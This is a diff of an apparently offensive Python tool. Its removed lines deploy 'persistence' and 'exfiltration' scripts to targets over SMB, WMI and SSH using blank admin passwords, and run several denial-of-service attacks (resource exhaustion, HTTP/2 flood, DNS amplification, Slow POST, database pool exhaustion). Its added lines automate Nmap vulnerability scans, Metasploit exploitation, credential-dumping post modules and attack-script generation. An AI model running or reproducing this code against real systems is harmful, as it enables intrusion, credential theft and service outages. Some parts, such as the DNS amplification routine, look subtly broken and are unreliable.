-            script_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
-            script_file.write(script)
-            script_file.close()
-            
-            # Copy the script to the target
-            if self._is_windows_target(target):
-                # Use SMB to copy the script
-                smb_client = smbclient.SambaClient(server=target, share='C$', username='Administrator', password='')
-                with open(script_file.name, 'rb') as f:
-                    smb_client.put_file(f, 'Windows\\Temp\\update.py')
-            else:
-                # Use SSH to copy the script
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(target, username='root', password='')
-                sftp = ssh.open_sftp()
-                sftp.put(script_file.name, '/tmp/update.py')
-                sftp.close()
-                ssh.close()
-            
-            # Execute the script
-            if self._is_windows_target(target):
-                # Use WMI to execute the script
-                wmi = wmi.WMI(computer=target, user='Administrator', password='')
-                wmi.Win32_Process.Create(CommandLine=f'python {script_file.name}')
-            else:
-                # Use SSH to execute the script
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(target, username='root', password='')
-                stdin, stdout, stderr = ssh.exec_command(f'python3 /tmp/update.py')
-                ssh.close()
-            
-            # Clean up
-            os.unlink(script_file.name)
-            
-            return True
-        except Exception as e:
-            self.logger.error(f"Error executing persistence script: {e}")
-            return False
-            
-    def _execute_exfiltration_script(self, target, script):
-        """Execute a data exfiltration script on the target."""
-        try:
-            # Create a temporary file for the script
-            script_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
-            script_file.write(script)
-            script_file.close()
-            
-            # Copy the script to the target
-            if self._is_windows_target(target):
-                # Use SMB to copy the script
-                smb_client = smbclient.SambaClient(server=target, share='C$', username='Administrator', password='')
-                with open(script_file.name, 'rb') as f:
-                    smb_client.put_file(f, 'Windows\\Temp\\exfil.py')
-            else:
-                # Use SSH to copy the script
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(target, username='root', password='')
-                sftp = ssh.open_sftp()
-                sftp.put(script_file.name, '/tmp/exfil.py')
-                sftp.close()
-                ssh.close()
-            
-            # Execute the script
-            if self._is_windows_target(target):
-                # Use WMI to execute the script
-                wmi = wmi.WMI(computer=target, user='Administrator', password='')
-                wmi.Win32_Process.Create(CommandLine=f'python {script_file.name}')
-            else:
-                # Use SSH to execute the script
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(target, username='root', password='')
-                stdin, stdout, stderr = ssh.exec_command(f'python3 /tmp/exfil.py')
-                ssh.close()
-            
-            # Clean up
-            os.unlink(script_file.name)
-            
-            return True
-        except Exception as e:
-            self.logger.error(f"Error executing exfiltration script: {e}")
-            return False
-            
-    def _is_windows_target(self, target):
-        """Check if the target is a Windows system."""
-        try:
-            # Try to connect using WMI
-            wmi = wmi.WMI(computer=target, user='Administrator', password='')
-            return True
-        except:
-            try:
-                # Try to connect using SMB
-                smb_client = smbclient.SambaClient(server=target, share='C$', username='Administrator', password='')
-                return True
-            except:
-                return False
-
-    def _cpu_exhaustion_attack(self, target):
-        """Perform a CPU exhaustion attack."""
-        try:
-            import threading
-            import time
-            import math
-            
-            def cpu_intensive():
-                while time.time() < end_time:
-                    # Perform CPU-intensive calculations
-                    for i in range(1000):
-                        math.factorial(i)
-                        
-            # Start attack threads
-            end_time = time.time() + self.dos_duration
-            threads = []
-            for _ in range(self.dos_threads):
-                thread = threading.Thread(target=cpu_intensive)
-                thread.daemon = True
-                thread.start()
-                threads.append(thread)
-                
-            # Wait for all threads to complete
-            for thread in threads:
-                thread.join()
-                
-            return True
-            
-        except Exception as e:
-            self.logger.error(f"Error in CPU exhaustion attack: {e}")
-            return False
-            
-    def _memory_exhaustion_attack(self, target):
-        """Perform a memory exhaustion attack."""
-        try:
-            import threading
-            import time
-            
-            def memory_intensive():
-                memory_blocks = []
-                while time.time() < end_time:
-                    try:
-                        # Allocate large memory blocks
-                        memory_blocks.append('x' * 1024 * 1024)  # 1MB blocks
-                    except:
-                        # Clear some blocks if memory is full
-                        if memory_blocks:
-                            memory_blocks.pop()
+                    f.write("Scan Results:\n")
+                    f.write("-------------\n")
+                    for i, result in enumerate(scan_results):
+                        f.write(f"Scan #{i+1}:\n")
+                        for host in result.get('hosts', []):
+                            host_ip = None
+                            for addr in host.get('addresses', []):
+                                if addr.get('addrtype') == 'ipv4':
+                                    host_ip = addr.get('addr')
+                                    break
+                                    
+                            f.write(f"  Host: {host_ip}\n")
                             
-            # Start attack threads
-            end_time = time.time() + self.dos_duration
-            threads = []
-            for _ in range(self.dos_threads):
-                thread = threading.Thread(target=memory_intensive)
-                thread.daemon = True
-                thread.start()
-                threads.append(thread)
-                
-            # Wait for all threads to complete
-            for thread in threads:
-                thread.join()
-                
-            return True
-            
-        except Exception as e:
-            self.logger.error(f"Error in memory exhaustion attack: {e}")
-            return False
-            
-    def _disk_exhaustion_attack(self, target):
-        """Perform a disk space exhaustion attack."""
-        try:
-            import threading
-            import time
-            import os
-            
-            def disk_intensive():
-                files = []
-                while time.time() < end_time:
-                    try:
-                        # Create large files
-                        filename = f"dos_file_{time.time()}.dat"
-                        with open(filename, 'wb') as f:
-                            f.write(os.urandom(1024 * 1024))  # 1MB files
-                        files.append(filename)
-                    except:
-                        # Clean up some files if disk is full
-                        if files:
-                            try:
-                                os.remove(files.pop())
-                            except:
-                                pass
+                            # Write port information
+                            for port in host.get('ports', []):
+                                port_id = port.get('id', {}).get('portid', 'unknown')
+                                protocol = port.get('id', {}).get('protocol', 'tcp')
+                                state = port.get('state', {}).get('state', 'unknown')
+                                service = port.get('service', {}).get('name', 'unknown')
                                 
-            # Start attack threads
-            end_time = time.time() + self.dos_duration
-            threads = []
-            for _ in range(self.dos_threads):
-                thread = threading.Thread(target=disk_intensive)
-                thread.daemon = True
-                thread.start()
-                threads.append(thread)
+                                f.write(f"    {port_id}/{protocol} - {state} - {service}\n")
+                            
+                            f.write("\n")
+                            
+                    if vuln_results:
+                        f.write("\nVulnerability Results:\n")
+                        f.write("---------------------\n")
+                        for result in vuln_results:
+                            f.write(f"Host: {result.get('host')}\n")
+                            
+                            for vuln in result.get('vulnerabilities', []):
+                                f.write(f"  {vuln.get('type')} on {vuln.get('port')}/{vuln.get('protocol')} ({vuln.get('service')})\n")
+                                
+                                # Write CVE IDs if available
+                                if 'cve_ids' in vuln and vuln['cve_ids']:
+                                    f.write(f"    CVEs: {', '.join(vuln['cve_ids'])}\n")
+                                    
+                                # Write CVSS score if available
+                                if 'cvss_score' in vuln:
+                                    f.write(f"    CVSS: {vuln['cvss_score']}\n")
+                                    
+                                f.write(f"    Output: {vuln.get('output', 'N/A')[:200]}...\n\n")
                 
-            # Wait for all threads to complete
-            for thread in threads:
-                thread.join()
+            logging.info(f"Results saved to {self.output_file}")
+        except Exception as e:
+            logging.error(f"Failed to save results: {str(e)}")
+            traceback.print_exc()
+
+    def execute_nmap_scan(self, target, scan_type="basic"):
+        """Execute an Nmap scan with the given parameters."""
+        try:
+            # Set up command-line arguments for Nmap
+            cmd = ["nmap"]
+            
+            # Apply port settings
+            if self.ports == "all":
+                cmd.extend(["-p-"])  # Scan all 65535 ports
+            elif self.ports == "quick":
+                cmd.extend(["-F"])   # Fast scan - top 100 ports
+            elif self.ports:
+                cmd.extend(["-p", self.ports])  # Custom port specification
+            
+            # Apply scan type options
+            if scan_type == "basic" or scan_type == "initial":
+                cmd.extend(["-sV", "-sC", "--min-rate=1000"])
+            elif scan_type == "stealth" or (scan_type == "basic" and self.stealth):
+                cmd.extend(["-sS", "-T2"])
+            elif scan_type == "comprehensive":
+                cmd.extend(["-sS", "-sV", "-sC", "-A", "-T4", "--min-rate=800"])
+            elif scan_type == "vuln" or self.vulnerability_scan:
+                cmd.extend(["-sV", "--script=vuln", "-T3"])
+            
+            # Add additional options based on flags
+            if self.services or self.version_detection:
+                cmd.extend(["-sV"])
+            if self.os_detection:
+                cmd.extend(["-O"])
+            
+            # Add target
+            cmd.append(target)
+            
+            # Add output format if specified
+            if self.output_file:
+                if self.output_format == "xml":
+                    cmd.extend(["-oX", self.output_file])
+                elif self.output_format == "json":
+                    cmd.extend(["-oX", f"{self.output_file}.xml"])  # We'll convert to JSON later
+                else:  # text
+                    cmd.extend(["-oN", self.output_file])
+            
+            # Always add XML output for parsing
+            temp_xml = os.path.join(tempfile.gettempdir(), f"nmap_scan_{int(time.time())}.xml")
+            cmd.extend(["-oX", temp_xml])
+            
+            # Execute the command
+            self.logger.debug(f"Executing Nmap command: {' '.join(cmd)}")
+            
+            if not self.quiet:
+                print(f"\nExecuting: {' '.join(cmd)}\n")
+            
+            # Use animation when not in quiet mode
+            if not self.quiet:
+                animation = SingleLineAnimation(f"Running Nmap scan against {target}")
+            else:
+                animation = DummyAnimator()
+            
+            # Execute Nmap and capture output
+            process = subprocess.Popen(
+                cmd, 
+                stdout=subprocess.PIPE, 
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            
+            stdout, stderr = process.communicate()
+            animation.set()  # Stop animation
+            
+            # Check for errors
+            if process.returncode != 0:
+                self.logger.error(f"Nmap scan failed: {stderr}")
+                return None
+            
+            # Parse XML output
+            try:
+                tree = ET.parse(temp_xml)
+                os.unlink(temp_xml)  # Clean up temp file
                 
-            # Clean up remaining files
-            for file in os.listdir():
-                if file.startswith("dos_file_"):
-                    try:
-                        os.remove(file)
-                    except:
-                        pass
-                        
-            return True
+                # Convert to JSON if requested
+                if self.output_file and self.output_format == "json":
+                    self.xml_to_json(temp_xml, self.output_file)
+                
+                return self.parse_nmap_xml(tree)
+            except Exception as e:
+                self.logger.error(f"Failed to parse Nmap output: {e}")
+                return None
             
         except Exception as e:
-            self.logger.error(f"Error in disk exhaustion attack: {e}")
-            return False
-            
-    def _http2_dos_attack(self, target):
-        """Perform an HTTP/2 DoS attack using multiple streams."""
+            self.logger.error(f"Error executing Nmap scan: {e}")
+            if self.debug:
+                traceback.print_exc()
+            return None
+    
+    def xml_to_json(self, xml_file, json_file):
+        """Convert Nmap XML output to JSON format."""
         try:
-            import h2.connection
-            import h2.events
-            import socket
-            import threading
-            import time
+            tree = ET.parse(xml_file)
+            root = tree.getroot()
             
-            def http2_attack():
-                while time.time() < end_time:
+            # Convert XML to dict
+            def node_to_dict(node):
+                result = {}
+                
+                # Add attributes
+                for key, value in node.attrib.items():
+                    result[key] = value
+                
+                # Process child elements
+                for child in node:
+                    child_dict = node_to_dict(child)
+                    
+                    # If this is a list-like element, append to list
+                    if child.tag in result:
+                        if not isinstance(result[child.tag], list):
+                            result[child.tag] = [result[child.tag]]
+                        result[child.tag].append(child_dict)
+                    else:
+                        result[child.tag] = child_dict
+                
+                # Add text content if present
+                if node.text and node.text.strip():
+                    if result:
+                        result["_text"] = node.text.strip()
+                    else:
+                        result = node.text.strip()
+                
+                return result
+            
+            # Convert to dict and save as JSON
+            nmap_dict = node_to_dict(root)
+            with open(json_file, 'w') as f:
+                json.dump(nmap_dict, f, indent=2)
+            
+            self.logger.info(f"Converted Nmap XML output to JSON: {json_file}")
+        except Exception as e:
+            self.logger.error(f"Failed to convert XML to JSON: {e}")
+            if self.debug:
+                traceback.print_exc()
+
+    def parse_nmap_xml(self, tree):
+        """Parse Nmap XML output and return structured data."""
+        root = tree.getroot()
+        result = {
+            'hosts': [],
+            'stats': {},
+            'scan_info': {}
+        }
+        
+        # Get scan info
+        if root.find('scaninfo') is not None:
+            scan_info = root.find('scaninfo').attrib
+            result['scan_info'] = scan_info
+        
+        # Get stats
+        if root.find('runstats') is not None:
+            finished = root.find('runstats/finished')
+            if finished is not None:
+                result['stats']['finished'] = finished.attrib
+            
+            hosts = root.find('runstats/hosts')
+            if hosts is not None:
+                result['stats']['hosts'] = hosts.attrib
+        
+        # Process each host
+        for host in root.findall('host'):
+            host_data = {
+                'addresses': [],
+                'hostnames': [],
+                'ports': [],
+                'os': [],
+                'status': host.find('status').attrib if host.find('status') is not None else {},
+                'scripts': []
+            }
+            
+            # Get addresses
+            for addr in host.findall('address'):
+                host_data['addresses'].append(addr.attrib)
+            
+            # Get hostnames
+            hostnames = host.find('hostnames')
+            if hostnames is not None:
+                for hostname in hostnames.findall('hostname'):
+                    host_data['hostnames'].append(hostname.attrib)
+            
+            # Get ports and services
+            ports = host.find('ports')
+            if ports is not None:
+                for port in ports.findall('port'):
+                    port_data = {
+                        'id': port.attrib,
+                        'state': port.find('state').attrib if port.find('state') is not None else {},
+                        'service': port.find('service').attrib if port.find('service') is not None else {},
+                        'scripts': []
+                    }
+                    
+                    # Get script output
+                    for script in port.findall('script'):
+                        script_data = {
+                            'id': script.attrib.get('id', ''),
+                            'output': script.attrib.get('output', '')
+                        }
+                        port_data['scripts'].append(script_data)
+                    
+                    host_data['ports'].append(port_data)
+            
+            # Get OS detection
+            os_elem = host.find('os')
+            if os_elem is not None:
+                for osmatch in os_elem.findall('osmatch'):
+                    os_data = {
+                        'name': osmatch.attrib.get('name', ''),
+                        'accuracy': osmatch.attrib.get('accuracy', ''),
+                        'osclass': []
+                    }
+                    
+                    for osclass in osmatch.findall('osclass'):
+                        os_data['osclass'].append(osclass.attrib)
+                    
+                    host_data['os'].append(os_data)
+            
+            # Get host scripts
+            hostscript = host.find('hostscript')
+            if hostscript is not None:
+                for script in hostscript.findall('script'):
+                    script_data = {
+                        'id': script.attrib.get('id', ''),
+                        'output': script.attrib.get('output', '')
+                    }
+                    host_data['scripts'].append(script_data)
+            
+            result['hosts'].append(host_data)
+        
+        return result
+
+    def run_vulnerability_scan(self, target_hosts):
+        """
+        Run vulnerability scans against target hosts using Nmap NSE scripts
+        and/or Metasploit modules if available.
+        """
+        logging.info("Starting vulnerability scan for %d hosts", len(target_hosts))
+        results = []
+        
+        # Choose appropriate NSE scripts for vulnerability scanning
+        vuln_scripts = "vuln,exploit,auth,brute"
+        
+        if self.custom_vuln_file:
+            # If user provided custom vulnerability definitions
+            try:
+                with open(self.custom_vuln_file, 'r') as f:
+                    custom_scripts = f.read().strip()
+                    if custom_scripts:
+                        vuln_scripts = custom_scripts
+                logging.info(f"Using custom vulnerability scripts from {self.custom_vuln_file}")
+            except Exception as e:
+                logging.error(f"Failed to load custom vulnerability file: {str(e)}")
+        
+        for host in target_hosts:
+            host_addr = None
+            # Extract the actual IP address
+            for addr in host.get('addresses', []):
+                if addr.get('addrtype') == 'ipv4':
+                    host_addr = addr.get('addr')
+                    break
+            
+            if not host_addr:
+                logging.warning("Could not determine IP address for host, skipping vulnerability scan")
+                continue
+                
+            # Get open ports
+            open_ports = []
+            for port in host.get('ports', []):
+                port_state = port.get('state', {}).get('state')
+                if port_state == 'open':
+                    port_id = port.get('id', {}).get('portid')
+                    if port_id:
+                        open_ports.append(port_id)
+            
+            if not open_ports:
+                logging.info(f"No open ports found for {host_addr}, skipping vulnerability scan")
+                continue
+                
+            logging.info(f"Running vulnerability scan on {host_addr} with {len(open_ports)} open ports")
+            
+            # Run Nmap NSE vulnerability scan
+            ports_arg = ",".join(open_ports)
+            nmap_cmd = [
+                "nmap", "-sV", "--script", vuln_scripts,
+                "-p", ports_arg, host_addr, "-oX", "-"
+            ]
+            
+            try:
+                logging.debug(f"Executing: {' '.join(nmap_cmd)}")
+                process = subprocess.Popen(
+                    nmap_cmd, 
+                    stdout=subprocess.PIPE, 
+                    stderr=subprocess.PIPE,
+                    text=True
+                )
+                
+                # Animated loading
+                if not self.quiet:
+                    self.animate_loading(f"Scanning {host_addr} for vulnerabilities", process)
+                
+                stdout, stderr = process.communicate()
+                
+                if process.returncode != 0:
+                    logging.error(f"Nmap vulnerability scan failed: {stderr}")
+                else:
+                    # Parse the XML output
                     try:
-                        # Create HTTP/2 connection
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.connect((target, 443))
-                        sock = ssl.wrap_socket(sock, server_hostname=target)
+                        import xml.etree.ElementTree as ET
+                        tree = ET.fromstring(stdout)
+                        vuln_results = self.extract_vulnerabilities(tree, host_addr)
+                        results.append(vuln_results)
+                        logging.info(f"Found {len(vuln_results.get('vulnerabilities', []))} potential vulnerabilities for {host_addr}")
+                    except Exception as e:
+                        logging.error(f"Failed to parse vulnerability scan results: {str(e)}")
+                        traceback.print_exc()
                         
-                        conn = h2.connection.H2Connection()
-                        conn.update_settings({
-                            h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS: 1000,
-                            h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: 65535
+            except Exception as e:
+                logging.error(f"Error during vulnerability scan: {str(e)}")
+                traceback.print_exc()
+                
+            # If MSF is enabled, use it for additional vulnerability checks
+            if self.msf_options and self.msf_module:
+                try:
+                    msf_results = self.run_metasploit_scan(host_addr, open_ports)
+                    if msf_results:
+                        # Merge with Nmap results
+                        for res in results:
+                            if res.get('host') == host_addr:
+                                res.setdefault('msf_results', []).extend(msf_results)
+                except Exception as e:
+                    logging.error(f"Error during Metasploit scan: {str(e)}")
+                    traceback.print_exc()
+                    
+        return results
+
+    def extract_vulnerabilities(self, tree, host_addr):
+        """Extract vulnerabilities from Nmap NSE script output"""
+        result = {
+            'host': host_addr,
+            'vulnerabilities': []
+        }
+        
+        root = tree
+        
+        # Find the host element for the target host
+        for host_elem in root.findall('.//host'):
+            # Check if this is the host we're looking for
+            addr_elem = host_elem.find(".//address[@addr='" + host_addr + "']")
+            if addr_elem is None:
+                continue
+                
+            # Process ports and their script outputs
+            for port_elem in host_elem.findall('.//port'):
+                port_id = port_elem.attrib.get('portid', 'unknown')
+                protocol = port_elem.attrib.get('protocol', 'tcp')
+                service_elem = port_elem.find('service')
+                service_name = service_elem.attrib.get('name', 'unknown') if service_elem is not None else 'unknown'
+                
+                # Process script results for this port
+                for script_elem in port_elem.findall('.//script'):
+                    script_id = script_elem.attrib.get('id', '')
+                    output = script_elem.attrib.get('output', '')
+                    
+                    # Only include vulnerability-related scripts
+                    if 'vuln' in script_id or 'exploit' in script_id or 'brute' in script_id:
+                        vuln_info = {
+                            'port': port_id,
+                            'protocol': protocol,
+                            'service': service_name,
+                            'type': script_id,
+                            'output': output.strip(),
+                            'source': 'nmap_nse'
+                        }
+                        
+                        # Attempt to extract CVE IDs or other vulnerability identifiers
+                        cve_match = re.findall(r'CVE-\d{4}-\d{4,7}', output)
+                        if cve_match:
+                            vuln_info['cve_ids'] = cve_match
+                            
+                        # Check for CVSS scores
+                        cvss_match = re.search(r'CVSS\s+(\d+\.\d+)', output)
+                        if cvss_match:
+                            vuln_info['cvss_score'] = cvss_match.group(1)
+                            
+                        result['vulnerabilities'].append(vuln_info)
+                        
+            # Process host scripts
+            hostscript_elem = host_elem.find('hostscript')
+            if hostscript_elem is not None:
+                for script_elem in hostscript_elem.findall('script'):
+                    script_id = script_elem.attrib.get('id', '')
+                    output = script_elem.attrib.get('output', '')
+                    
+                    # Only include vulnerability-related scripts
+                    if 'vuln' in script_id or 'exploit' in script_id or 'brute' in script_id:
+                        vuln_info = {
+                            'port': 'N/A',
+                            'protocol': 'N/A',
+                            'service': 'host',
+                            'type': script_id,
+                            'output': output.strip(),
+                            'source': 'nmap_nse'
+                        }
+                        
+                        # Attempt to extract CVE IDs or other vulnerability identifiers
+                        cve_match = re.findall(r'CVE-\d{4}-\d{4,7}', output)
+                        if cve_match:
+                            vuln_info['cve_ids'] = cve_match
+                            
+                        # Check for CVSS scores
+                        cvss_match = re.search(r'CVSS\s+(\d+\.\d+)', output)
+                        if cvss_match:
+                            vuln_info['cvss_score'] = cvss_match.group(1)
+                            
+                        result['vulnerabilities'].append(vuln_info)
+                        
+        return result
+
+    def run_metasploit_scan(self, host_addr, open_ports):
+        """Run a Metasploit scan against a target host"""
+        if not self.msf_options or not self.msf_module:
+            logging.info("Metasploit options or module not specified, skipping MSF scan")
+            return []
+            
+        logging.info(f"Running Metasploit scan on {host_addr}")
+        results = []
+        
+        try:
+            # Import Metasploit libraries
+            from pymetasploit3.msfrpc import MsfRpcClient
+            
+            # Connect to MSF RPC
+            msf_host = self.msf_options.get('host', '127.0.0.1')
+            msf_port = int(self.msf_options.get('port', 55552))
+            msf_user = self.msf_options.get('user', 'msf')
+            msf_pass = self.msf_options.get('pass', 'abc123')
+            
+            logging.debug(f"Connecting to MSF RPC at {msf_host}:{msf_port}")
+            client = MsfRpcClient(msf_pass, server=msf_host, port=msf_port, ssl=False, username=msf_user)
+            logging.debug("Connected to MSF RPC")
+            
+            # Use the specified module
+            module_type, module_name = self.msf_module.split('/', 1)
+            
+            if module_type not in ['auxiliary', 'exploit', 'scanner']:
+                logging.error(f"Unsupported Metasploit module type: {module_type}")
+                return []
+                
+            # Get the module
+            module = client.modules.use(module_type, module_name)
+            logging.debug(f"Using MSF module: {self.msf_module}")
+            
+            # Set required options
+            module['RHOSTS'] = host_addr
+            
+            # If ports are specified, add them
+            if module.required and 'RPORT' in module.required:
+                # Use the first open port if available
+                if open_ports:
+                    module['RPORT'] = open_ports[0]
+            
+            # Set payload if exploit
+            if module_type == 'exploit' and self.msf_payload:
+                module['PAYLOAD'] = self.msf_payload
+                
+            # Execute the module
+            logging.info(f"Executing MSF module {self.msf_module} against {host_addr}")
+            job_id = module.execute()
+            
+            # Wait for results
+            import time
+            time.sleep(5)  # Initial wait
+            
+            # Get job info
+            jobs = client.jobs.list
+            logging.debug(f"Active MSF jobs: {jobs}")
+            
+            # Check session results
+            sessions = client.sessions.list
+            logging.debug(f"MSF sessions: {sessions}")
+            
+            if sessions:
+                for session_id, session_info in sessions.items():
+                    logging.info(f"MSF session established: {session_id} - {session_info.get('info', 'No info')}")
+                    results.append({
+                        'type': 'msf_session',
+                        'session_id': session_id,
+                        'info': session_info
+                    })
+                    
+                    # If post-exploitation is enabled, run post modules
+                    if self.post_exploitation and session_info.get('type') == 'meterpreter':
+                        post_results = self.run_post_exploitation(client, session_id)
+                        results.extend(post_results)
+                    
+                    # Cleanup - close session if not needed
+                    if not self.post_exploitation:
+                        client.sessions.session(session_id).stop()
+            
+            # Get console output for auxiliary modules
+            if module_type == 'auxiliary':
+                # Create a console to view output
+                console_id = client.consoles.console().cid
+                console = client.consoles.console(console_id)
+                
+                # Read output
+                output = console.read()
+                if output and output.get('data'):
+                    results.append({
+                        'type': 'msf_auxiliary_output',
+                        'output': output.get('data'),
+                        'module': self.msf_module
+                    })
+                    
+                # Destroy console
+                console.destroy()
+                
+            return results
+                
+        except ImportError:
+            logging.error("Failed to import pymetasploit3. Make sure it's installed.")
+            return []
+        except Exception as e:
+            logging.error(f"Error during Metasploit scan: {str(e)}")
+            traceback.print_exc()
+            return []
+            
+    def run_post_exploitation(self, msf_client, session_id):
+        """Run post-exploitation modules if a session is established"""
+        results = []
+        
+        try:
+            session = msf_client.sessions.session(session_id)
+            
+            # Basic system info
+            logging.info(f"Running post-exploitation on session {session_id}")
+            
+            if hasattr(session, 'run_with_output'):
+                # Run basic commands
+                commands = [
+                    "sysinfo",
+                    "getuid",
+                    "getpid",
+                    "ps",
+                    "ipconfig"
+                ]
+                
+                for cmd in commands:
+                    try:
+                        output = session.run_with_output(cmd)
+                        results.append({
+                            'type': 'msf_post_command',
+                            'command': cmd,
+                            'output': output
+                        })
+                    except Exception as e:
+                        logging.error(f"Error running post command '{cmd}': {str(e)}")
+                
+                # Run appropriate post modules
+                post_modules = [
+                    "post/windows/gather/hashdump",
+                    "post/linux/gather/hashdump",
+                    "post/multi/gather/ssh_creds",
+                    "post/windows/gather/credentials/credential_collector"
+                ]
+                
+                for module_name in post_modules:
+                    try:
+                        module = msf_client.modules.use('post', module_name.split('/', 2)[2])
+                        module['SESSION'] = session_id
+                        job_id = module.execute()
+                        
+                        # Wait for execution
+                        import time
+                        time.sleep(3)
+                        
+                        # Get console output
+                        console_id = msf_client.consoles.console().cid
+                        console = msf_client.consoles.console(console_id)
+                        output = console.read()
+                        
+                        results.append({
+                            'type': 'msf_post_module',
+                            'module': module_name,
+                            'output': output.get('data') if output else "No output"
                         })
                         
-                        # Send multiple streams
-                        for i in range(100):
-                            stream_id = conn.get_next_available_stream_id()
-                            conn.send_headers(
-                                stream_id,
-                                [(':method', 'GET'),
-                                 (':path', '/'),
-                                 (':scheme', 'https'),
-                                 (':authority', target),
-                                 ('user-agent', 'Mozilla/5.0')],
-                                end_stream=False
-                            )
-                            conn.send_data(stream_id, b'x' * 65535, end_stream=True)
-                            
-                        sock.close()
-                    except:
-                        pass
-                        
-            # Start attack threads
-            end_time = time.time() + self.dos_duration
-            threads = []
-            for _ in range(self.dos_threads):
-                thread = threading.Thread(target=http2_attack)
-                thread.daemon = True
-                thread.start()
-                threads.append(thread)
-                
-            # Wait for all threads to complete
-            for thread in threads:
-                thread.join()
-                
-            return True
+                        console.destroy()
+                    except Exception as e:
+                        logging.error(f"Error running post module '{module_name}': {str(e)}")
             
         except Exception as e:
-            self.logger.error(f"Error in HTTP/2 DoS attack: {e}")
-            return False
+            logging.error(f"Error during post-exploitation: {str(e)}")
+            traceback.print_exc()
             
-    def _dns_amplification_attack(self, target):
-        """Perform a DNS amplification attack."""
+        return results
+
+    def generate_attack_script(self, scan_results, vulnerability_results):
+        """Generate an attack script based on scan results and discovered vulnerabilities"""
+        if not self.generate_script:
+            return None
+            
+        logging.info("Generating attack script based on scan results")
+        
+        # Determine script type
+        script_type = self.script_type or 'python'  # Default to Python
+        script_name = self.generate_script_name or f"attack_script_{int(time.time())}"
+        
+        # Add extension if not already there
+        if not script_name.endswith(self._get_script_extension(script_type)):
+            script_name += self._get_script_extension(script_type)
+            
+        script_content = []
+        
+        # Add script header and imports
+        script_content.extend(self._generate_script_header(script_type))
+        
+        # Add target information
+        targets = []
+        for result in scan_results:
+            for host in result.get('hosts', []):
+                host_ip = None
+                for addr in host.get('addresses', []):
+                    if addr.get('addrtype') == 'ipv4':
+                        host_ip = addr.get('addr')
+                        break
+                        
+                if host_ip:
+                    targets.append(host_ip)
+                    
+        script_content.extend(self._generate_target_section(script_type, targets))
+        
+        # Add exploit code for vulnerabilities if any
+        if vulnerability_results:
+            script_content.extend(self._generate_exploit_section(script_type, vulnerability_results))
+            
+        # Add utility functions
+        script_content.extend(self._generate_utility_section(script_type))
+        
+        # Add main execution block
+        script_content.extend(self._generate_main_section(script_type))
+        
+        # Write script to file
         try:
-            import socket
-            import threading
-            import time
+            with open(script_name, 'w') as f:
+                f.write('\n'.join(script_content))
             
-            def dns_attack():
-                while time.time() < end_time:
-                    try:
-                        # Create DNS query for ANY record
-                        query = self.dos_payload.encode() if self.dos_payload else b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01'
-                        
-                        # Send to multiple DNS servers
-                        for dns_server in ['8.8.8.8', '8.8.4.4', '1.1.1.1']:
-                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                            sock.sendto(query, (dns_server, 53))
-                            sock.close()
-                    except:
-                        pass
-                        
-            # Start attack threads
-            end_time = time.time() + self.dos_duration
-            threads = []
-            for _ in range(self.dos_threads):
-                thread = threading.Thread(target=dns_attack)
-                thread.daemon = True
-                thread.start()
-                threads.append(thread)
+            # Make script executable if not on Windows
+            if not sys.platform.startswith('win') and (script_type == 'bash' or script_type == 'python'):
+                os.chmod(script_name, os.stat(script_name).st_mode | stat.S_IXUSR | stat.S_IXGRP)
                 
-            # Wait for all threads to complete
-            for thread in threads:
-                thread.join()
-                
-            return True
-            
+            logging.info(f"Attack script generated: {script_name}")
+            return script_name
         except Exception as e:
-            self.logger.error(f"Error in DNS amplification attack: {e}")
-            return False
+            logging.error(f"Failed to generate attack script: {str(e)}")
+            traceback.print_exc()
+            return None
             
-    def _slowpost_attack(self, target):
-        """Perform a Slow POST attack."""
-        try:
-            import socket
-            import threading
-            import time
-            
-            def slowpost():
-                while time.time() < end_time:
-                    try:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.connect((target, 80))
-                        
-                        # Send headers
-                        headers = (
-                            "POST / HTTP/1.1\r\n"
-                            f"Host: {target}\r\n"
-                            "Content-Type: application/x-www-form-urlencoded\r\n"
-                            "Content-Length: 1000000\r\n"
-                            "\r\n"
-                        )
-                        sock.send(headers.encode())
-                        
-                        # Slowly send data
-                        while time.time() < end_time:
-                            sock.send(b'x' * 100)
-                            time.sleep(0.1)
-                            
-                        sock.close()
-                    except:
-                        pass
-                        
-            # Start attack threads
-            end_time = time.time() + self.dos_duration
-            threads = []
-            for _ in range(self.dos_threads):
-                thread = threading.Thread(target=slowpost)
-                thread.daemon = True
-                thread.start()
-                threads.append(thread)
-                
-            # Wait for all threads to complete
-            for thread in threads:
-                thread.join()
-                
-            return True
-            
-        except Exception as e:
-            self.logger.error(f"Error in Slow POST attack: {e}")
-            return False
-            
-    def _dbpool_exhaustion_attack(self, target):
-        """Perform a database connection pool exhaustion attack."""
-        try:
-            import mysql.connector
-            import threading
-            import time
-            
-            def db_attack():
-                while time.time() < end_time:
-                    try:
-                        # Try to establish database connections
-                        conn = mysql.connector.connect(
-                            host=target,
-                            user="root",
-                            password="",
-                            connection_timeout=1
-                        )
-                        time.sleep(0.1)  # Keep connection open
-                    except:
-                        pass
-                        
-            # Start attack threads
-            end_time = time.time() + self.dos_duration
-            threads = []
-            for _ in range(self.dos_threads):
-                thread = threading.Thread(target=db_attack)
-                thread.daemon = True
-                thread.start()
-                threads.append(thread)
-                
-            # Wait for all threads to complete
-            for thread in threads:
-                thread.join()
-                
-            return True
-            
-        except Exception as e:
-            self.logger.error(f"Error in database pool exhaustion attack: {e}")
-            return False
-            
-    def _cache_poisoning_attack(self, target):
-        """Perform a cache poisoning attack."""
-        try:
-            import socket
-            import threading
-            import time
-            
-            def cache_attack():
